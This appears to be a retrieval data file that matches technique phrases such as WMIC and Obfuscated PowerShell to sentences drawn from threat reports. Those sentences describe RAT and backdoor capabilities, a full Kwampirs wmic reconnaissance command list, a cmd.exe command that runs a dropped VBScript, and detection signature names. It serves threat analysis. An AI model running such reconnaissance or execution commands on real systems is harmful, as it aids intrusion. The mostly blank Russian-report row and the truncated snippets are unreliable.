hash|phrase|similarity|adjacent_sentences
1420552,1848554,6240896,450901,3081569,6289873,1568841,160607,5626186,210700,1538528,343617,6084318,128441,2688517,3084389,3655074,1320109,2376874,2388996,1161994,22877,3818112,4857002,2978167,451836,1271261,1521916,6999829,395870,1826161,1452202,4757817,528225,1285042,325759,400841,2362921,4878686,5841217,4464838,3914904,4104875,7468134,8636083,168446,140586,2393782,93648,583171,1390237,8049892,2031412,11660676,358757,557991,6760023,395549,3512306,6610976,1235269,2564191,1273891,2685657,745699,8379426,12232,541390,1169998,7867591,1571165,1932616,65771,3290147,7495322,619164,687837,1594742,1008115,430228,5100988,636448,1743522,908024,5033754,2319043,6497037,4582050,6061460,1450932,7209305,2933573,2304875,3492989,5174661,1081688,2837940,1983700,310578,1307595,2278521,6227883,2274667,28107,595253,2904225,626106,3070446,2583523,914881,2743013,6290379,1153379,2387170,2120709,226901,1330228,4086786,2147288,143146,7805551,1677124,2619715,3030832,333147,274588,5410447,62944|Command Line Execution|0.7597022778990548|"['Diagram for a heartbeat C2 message.', 'The C2 server returns JSON data instructing the backdoor with the next actions to take.', 'The JSON response contains the same two main keys: code: A value specifying an action or command args: A string or JSON dictionaries with multiple key value pairs containing the required arguments for the specified command InvisibleFerret implements a total of eight commands described below in Table 4.', 'Command Description Checks if the args value is equal to delete and if so, closes the session.', 'To notify the C2 server, it ssh_cmd sends the message string [close].', 'Command execution.', ""Extracts the command value from args['cmd'] and runs it."", 'JSON results ssh_obj sent to the C2 server with code value 1 and args indicating the results.', 'Send contents of keylogger buffer and clipboard data.', 'Reports to C2 server with JSON code ssh_clip value 3 and args containing the collected data.', '9/17ssh_run Downloads and runs the browser stealer component.']"
343527,90031,174508,984460,498956,323430,4555,247849,151626,87497,335772,123193,468532,13272,492091,503004,93406,17538,208285,259937,80811,73975,1611909,13135,243448,459262,469835,728536,184883,124548,182985,26021,169664,84786,302769,1636339,146407,981,1645,981057,409199,372356,765685,375921,90091,374832,712372,345611,384837,104738,722340,149879,121750,7738,1895969,141975,30521,236218,25505,222670,13854,217470,813503,487565,218153,251505,246513,639507,8876,183524,195297,234740,45432,591719,74041,234682,9885,64200,60243,38438,496690,553847,590341,328492,20121,866000,22125,40291,24933,352058,703304,313635,17410,801320,39083,533702,821891,458436,146228,369870,535066,15112,276700,31182,570690,330314,215432,93028,165376,448529,880033,380314,461927,45760,515072,28927,276460,717401,35307,1478979,672499,261936,40879,31406,106385,501201,663968,1865445|WMIC|0.773524739341554|['-        -     .', 'Hi-Tech Crime Trends                  ,    - ,    .', 'Hi-Tech Crime Trends   -,   - , SOC-,     ,           .', 'Hi-Tech Crime Trends   -      ,          ,    .', 'Group-IB   ,    ,        -       -     .', '.', 'Group-IB:   ,    ,     Leaks   ,    ,            ,    ,    ,    Group-IB     ,    ,         ,     ,     ,     GROUP-IB.RU   6     Group-IB       Hi-Tech Crime Trends,                           .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response  Digital Risk Protection.', 'Group-IB                       , ,   - .', ',     Group-IB        ,          .', ',  -  -     .']
2580654,60556,154190,450901,1246945,1956688,2667612,160607,693538,6475993,555110,122469,85338,874238,1886773,1327550,116320,304913,2229682,477735,1887686,1637800,644771,5920,348361,348438,1324353,1207115,614198,671603,537438,1452202,1427739,528225,151426,280867,539112,904925,484918,1370963,2971836,447996,2411081,1004199,1994469,928203,140586,391335,61146,1431792,114528,649515,2031412,2002404,115547,557991,134491,251887,839951,78651,376354,826623,171273,320348,745699,1778572,12232,339199,3656,317735,1242613,1921389,1506524,215436,474178,539955,565282,814536,1008115,470857,1007993,99339,677727,1345385,2448536,4130332,2005414,580705,134600,1450932,1357031,350117,998302,425153,315309,747246,792451,282804,310578,25234,1401654,630242,377029,28107,595253,123089,751071,99727,1774901,914881,1842549,1012132,1153379,933690,580326,162911,51404,480440,100529,989728,668625,82201,1622103,1264245,226445,360512,357287,253169|WMIC|0.8601303879519202|[]
2580654,60556,154190,450901,1246945,1956688,2667612,160607,693538,6475993,555110,122469,85338,874238,1886773,1327550,116320,304913,2229682,477735,1887686,1637800,644771,5920,348361,348438,1324353,1207115,614198,671603,537438,1452202,1427739,528225,151426,280867,539112,904925,484918,1370963,2971836,447996,2411081,1004199,1994469,928203,140586,391335,61146,1431792,114528,649515,2031412,2002404,115547,557991,134491,251887,839951,78651,376354,826623,171273,320348,745699,1778572,12232,339199,3656,317735,1242613,1921389,1506524,215436,474178,539955,565282,814536,1008115,470857,1007993,99339,677727,1345385,2448536,4130332,2005414,580705,134600,1450932,1357031,350117,998302,425153,315309,747246,792451,282804,310578,25234,1401654,630242,377029,28107,595253,123089,751071,99727,1774901,914881,1842549,1012132,1153379,933690,580326,162911,51404,480440,100529,989728,668625,82201,1622103,1264245,226445,360512,357287,253169|WMIC|0.8836392615299994|['This module executes a series of commands to gather additional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the commands are not identical to the analogous module examined in the initial Symantec report.', 'These commands executed by this module are almost all wmic commands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snippet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypass configuration arrays with an iterator (v2).', 'Shamoon 1, 2 and 3 and Kwampirs, all contain arrays for C2, and Proxy, ProxyByPass, and accessType information.', 'INDEX cylera.com24 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAddress, EndingAddress wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconnector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snippet 9: Kwampirs commands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it seems likely that the use of this module is intended for a reconnaissance phase.', 'The types of information gathered may imply that the physical attributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be inferred from this information.', 'INDEX cylera.com25 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon 5.1.5 Artifact Similarities File Metadata The metadata of the dropper and reporter components (DLL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamoon (Figures 30, 31, 32 and 33), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Dropper Shamoon Dropper Figure 30: Kwampirs dropper metadata Figure 31: Shamoon dropper metadata INDEX cylera.com26 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon Kwampirs Reporter Shamoon Reporter Figure 32: Kwampirs reporter metadata Figure 33: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples looks different and contains many different tools.']
6411941,1308200,6486315,2185685,5159212,4998679,13912681,527077,9111110,210700,3912752,17470031,3183692,432937,660454,7735372,11748746,304913,5046864,7973321,4348658,332501,18980574,22359662,4836413,11240945,1300949,8874972,9998687,5442079,5684145,2120398,9771306,528225,9919743,7793242,3361707,904925,17080176,1434822,2383079,7175991,1572129,1792835,7150152,3247985,140586,9715512,8240102,8978518,1390237,4965337,2031412,15889489,358757,1166550,9859852,395549,4323404,11088831,1235269,764685,9358340,2874150,2663878,11150435,3148072,3498867,17798266,11128502,5842016,4126232,65771,7409211,6726051,8928777,1375471,1715290,1877486,1081391,4920974,6306853,1743522,12989735,4451165,4200632,12915909,8502036,6061460,7495738,8403455,2933573,4807406,16357084,428184,5229812,3000894,282804,3522355,5141369,14909610,5069508,12160900,7353124,5910747,916397,751071,1634069,4904426,3674981,8198026,2332438,14044000,2387170,3875981,162911,6292514,4956964,7099364,989728,7539391,1677124,655209,4241466,11000886,1528994,10341543,3622266|delete important files|0.7776668617012203|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
6133174,11405128,10010167,1489418,9926922,7829423,12673617,527077,216965,17873097,1538528,2267646,9684172,12265261,10992616,16867886,5246885,1320109,2376874,11100931,1549220,10540256,7966829,583074,11976598,743433,4488304,4458109,6331964,4640612,9367234,804298,14440663,4398681,29515582,15893949,2492561,904925,5087106,12108341,13724973,8048436,16391809,1120881,920150,28257547,21954100,1112268,7912210,5866891,1390237,4965337,5892332,338610,12751946,13802806,2966478,395549,1252332,3978952,1235269,25459430,14064513,36250777,953997,9207881,35218412,20876282,390763,7225834,9582915,7983738,10258276,6787830,20554386,2550456,16370190,1715290,1398380,1081391,5100988,24519354,2585331,8485623,5662685,23974405,12349058,480909,240157,1450932,6803013,2949253,2058778,18333482,315309,565729,2549822,4418292,310578,1294129,14909610,6716289,25756710,9500342,13727289,1543963,626106,99727,6264013,16857593,1496203,20229549,1250663,1412126,1803035,15008614,4778538,2381536,11231102,989728,5307072,1677124,1996139,16653158,27533801,10857629,30573421,4773609|Themida-packed|0.8186853125341216|['Initial infection is carried out via a malicious executable.', 'An embedded bitmap image (contained in the trojan) is decoded into shellcode upon execution, thus loading the implant.', 'Network communications are encrypted via XOR.', 'The analyzed BISTROMATH samples, along with the other families all attempt to evade analysis via common sandboxes (VIRTUALBOX, QEMU, VMware) via multiple artifact checks (presence of specific devices, registry entries, processes, files).Core functionality includes: File and Process manipulation File/Data upload/exfiltration Timestamp modification/masquerading Service start/stop CMD shell access / use Screenshot Capture Microphone Capture Webcam Control Keylogging Browser hijacking/form grabbing Exfiltration of cached credentials Self-management (update/uninstall)HOPLIGHTProxy payload to obfuscate and/or re-route traffic between infected hosts and C2.', 'Traffic is encrypted over SSL, and the individual payloads are capable of generating fake SSL Certificates.', 'Analyzed samples are Themida packed.', 'One of the examples (SHA256: d77fdabe17cdba62a8e728cbe6c740e2c2e541072501f77988674e07a05dfb39) provided by CISA contained a public SSL certificate and encrypted payload.SLICKSHOESSLICKSHOES is typically utilized as a loader/Dropper.', 'The malware writes itself to C:WindowsWebtaskenc.exe.', 'Separate processes are responsible for the manipulation and execution of the dropped executable.', 'SLICKSHOES is a full beacon-style implant (similar to Cobalt Strike).Makes use of bespoke encoding methods and is capable of RAT-like functionality.', 'File and Process manipulation System recon and exfiltration Input capture Command/process execution and manipulationSLICKSHOES communicates to a hardcoded C2 address (188[.]165[.]37[.']
6133174,2248874,109812,4058846,9926922,5284235,4544497,227765,4878514,5465827,1538528,6211461,385616,2286612,1886773,11925995,3055130,1320109,5312691,6475904,387461,3905476,7966829,1650510,881110,451836,6116066,21960,5869345,3181374,3901026,238772,3814484,528225,450747,5261500,3561011,904925,4732738,8780955,2225324,8048436,4484560,1321919,400949,5564078,1546722,2257890,1850980,2414303,2018402,7635835,4386949,9206322,944721,557991,10315747,5098092,3512306,1071102,1235269,1406248,1273891,3075552,1765049,6149,1578189,3920078,1169998,1346686,2275668,2048961,5671570,274259,2346958,539955,5312796,1594742,19264601,1081391,5100988,6306853,1743522,4254314,2923161,1431841,6174537,2738404,4671402,2051858,1357031,7492623,6336411,471631,3668424,2990592,1073040,569869,310578,571543,13217,1317985,2752861,28107,3717721,1543963,626106,1634069,5082373,1582967,4651421,1061732,1957091,3457816,694363,801913,4778538,1456033,483341,989728,2789300,3131611,3886358,8920597,5101138,1731370,432061,62944|upload/download file|0.7907829044012105|['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 2022.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum 4/17vitae (similar to a resume) of an individual named Roshan.']
3242800,2248874,4279339,1406700,4060997,3091719,2667612,527077,10369549,5679208,1538528,1616244,273415,4976110,8598674,2314275,4421565,304913,847919,4085748,1887686,1700568,311967,1526538,3474163,285087,1300949,4117737,4109846,671603,11269892,1002302,894998,4273499,4592086,245655,1140966,904925,1245274,1529414,806312,1550993,1572129,1321919,1424820,2635242,1771774,391335,1942428,3728851,1390237,4856150,234571,637427,358757,1166550,1777495,395549,4241899,1264752,1235269,1666583,171273,2874150,1176926,95207,103012,155833,1169998,1990956,2119705,1760844,3831648,5496816,3632127,3156213,2889346,1715290,208774,2650281,5100988,629887,2008690,2981302,1207127,2319043,1872955,2738404,2396794,3623463,3252105,712776,4506123,3492989,185003,3760992,1532591,282804,3522355,1190280,7284930,2200313,2789927,4179729,40464,332526,787703,1298235,1774901,968726,4651421,2365513,1957091,2387170,3875981,1662263,178743,4693866,3526366,989728,5307072,2117356,3735512,4241466,333147,1528994,2394533,3188038|upload/download file|0.8084070252298003|['command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include:  Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Command handler of MargulasRAT.', 'containing a limited set of capabilities.']
2136382,30933,3594284,453750,2003845,967615,1139015,527077,2709365,4590772,540980,343617,4691642,991010,1886773,6099451,3055130,1320109,2473623,2399050,425930,486392,2771714,102327,3474163,2227735,658294,3767111,2846324,2355852,1816582,1452202,212576,528225,450747,6401481,400841,3376723,109846,3734361,2237340,14261,4104875,1120881,1994469,3004970,40836,1300803,61146,2807196,1812632,4856150,1869544,1264883,358757,557991,112973,5098092,150572,2221128,97283,167491,171273,3549008,745699,1929355,12232,3068366,1169998,193085,828720,2186838,3769928,215436,1624088,539955,1552226,3358772,1035230,181248,48349,99339,1400975,2111194,3238615,1203647,6180455,1804505,1849944,1450932,1357031,1703009,1687682,425153,315309,963472,2780391,282804,3319612,1307595,4032066,1317985,2752861,28107,595253,332526,626106,1636840,5009018,2095714,1523565,1674881,1153379,916658,573111,162911,2043274,3660070,2147288,279350,2789300,2485405,1622103,3166018,333147,895072,4643121,62944|Obfuscated PowerShell script|0.7796168383819737|['but we still needed to go one layer deeper and verify the  1:54114 MALWARE-OTHER Html.Trojan.CobaltStrike shellcode was unique in this module.', 'We base64-decode powershell payload download attempt the data and decrypt it using the same `0x23` default  1:54115 MALWARE-OTHER Html.Trojan.CobaltStrike XOR key  and its already much larger than the previous powershell payload download attempt payload.', 'Lastly, we have the VBA Method.', 'Our researchers found Its not raw shellcode like we saw in the HTA payloads, this easy to cover because HTA files dont often interface you can immediately see that the MZ header is present.', 'with Excel workbooks, let alone one that tinkers with the This seems to be a stageless beacon included in the AccessVBOM registry key.', 'powershell script.', 'You might wonder why it wasnt included in the HTA attack.', 'The reason is the HTA module  1:54116 MALWARE-OTHER Html.Trojan.CobaltStrike is executing a Powershell one-liner and Windows has VBA payload download attempt a character limit on command line strings, 32767.', 'That  1:54117 MALWARE-OTHER Html.Trojan.CobaltStrike number is even lower when executing a command from VBA payload download attempt `cmd.exe`, 8191.', 'The character limit varies across a variety of execution methods and these numbers are not always From there, we cloned all that to ClamAV coverage to get going to be correct.', 'the following signatures:  Html.Trojan.CobaltStrike-7932561-0 Since this payload is downloaded using a small one-liner to execute a string retrieved from the Cobalt Strike controlled  Html.Trojan.CobaltStrike-7932562-0 server, that limit is bypassed and a more reliable payload  Html.Trojan.CobaltStrike-7932563-0 can be provided.']
709927,11615736,7034219,547009,9994063,7829423,4801307,10728620,11568794,5679208,1538528,3736017,13688128,4976110,9477397,271858,2059713,39873603,7011872,4085748,12504639,332501,1064603,5594786,1547792,1778695,1324353,1338107,14314567,781666,6207005,804298,2634298,13702993,1910638,8248936,1590338,185762,2544209,8780955,48574405,4163105,3428830,1321919,3545294,5564078,3890878,1112268,17334005,3728851,2018402,7980156,30442809,637427,11250642,5787605,8484233,1266990,14648640,2170590,16973231,2906234,10055390,15767701,4365656,1434057,5103069,5224622,263836,7867591,3837077,2579604,10258276,625475,7495322,763131,3135516,25014687,8341277,430228,5100988,99339,10985832,15154920,8841244,18386015,12048473,2738404,6466166,19496487,15803516,9722106,3608443,3492989,994006,5229812,16267264,192023,20854547,1781149,1534879,762471,22173503,3614050,16577116,1543963,626106,37299292,12821873,14770718,7936346,20229549,1957091,5255564,1509448,12788432,14187457,22642641,11709351,10524672,2238656,11787674,15840429,1245527,5101138,6786193,4450784,17057499|Obfuscated PowerShell script|0.7622235917995965|['Figure 8: Return address, overwritten with WinExec VBScript Analysis: https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 6/128/12/2020 Gorgon APT targeting MSME sector in India After successful exploitation, cmd.exe is executed with commands: /c cscript %tmp%\\\\ServerCrypted.vbs >> AC This command creates a cscript.exe process to execute code in ServerCrypted.vbs.', 'VBScript file was already dropped in %temp% folder by WinWord process.', 'Below Figure shows the VBScript code.', 'As shown in figure 9 and figure 10, actors used some AV- vendors names in function names, variable names, and strings.', 'This VBScript is responsible to execute two processes, cmd.exe and powershell.exe.', 'Figure 10 shows the obfuscated PowerShell script.', 'Figure 9: Contents of ServerCrypted.vbs https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 7/128/12/2020 Gorgon APT targeting MSME sector in India Figure 10: Contents of ServerCrypted.vbs PowerShell Analysis: Figure 11 shows the de-obfuscated PowerShell script.', 'As shown below, the script downloads two files with a .jpg extension.', 'First file 15882060891.jpg is a PowerShell script which contains encoded injector DLL written in C#, as shown in figure 12.', 'This DLL is loaded in-memory by PowerShell.', 'In this script, actors used some interesting names of class and function of injector DLL like FlorianRoth and Cyb3rOps.']
